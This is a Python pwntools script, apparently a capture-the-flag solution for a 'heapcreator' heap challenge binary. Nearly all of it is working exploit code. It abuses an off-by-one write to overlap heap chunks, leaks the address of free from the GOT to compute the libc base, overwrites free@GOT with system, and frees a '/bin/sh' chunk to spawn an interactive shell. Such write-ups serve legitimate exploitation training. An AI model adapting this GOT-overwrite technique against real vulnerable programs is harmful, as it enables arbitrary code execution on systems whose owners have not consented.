#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : heapcreator.py
from pwn import *
context.log_level = 'debug'
p = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,context):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Heap : ")
	p.sendline(str(size))
	p.recvuntil("heap:")
	p.send(context)
def edit(id,context):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(id))
	p.recvuntil("heap :")
	p.send(context)
def show(id):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(id))
def free(id):
	p.recvuntil("choice :")
	p.sendline("4")
	p.recvuntil("Index :")
	p.sendline(str(id))
def exit():
	p.recvuntil("choice :")
	p.sendline("5")

# off-by-one
create(0x18,'a'*0x10)#0
create(0x10,'b'*0x10)#1
edit(0,"/bin/sh\x00".ljust(0x18,'a') + "\x41")
free(1)

# leak libc
free_got = elf.got['free']
create(0x30,'a'*0x18+p64(0x21)+p64(0x30)+p64(free_got))
show(1)
p.recvuntil("Content : ")

free_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("free_addr:"+hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.info("libc_base:"+hex(libc_base))
system = libc_base + libc.symbols['system']
log.info("system:"+hex(system))

edit(1,p64(system))
#gdb.attach(p)
free(0)

p.interactive()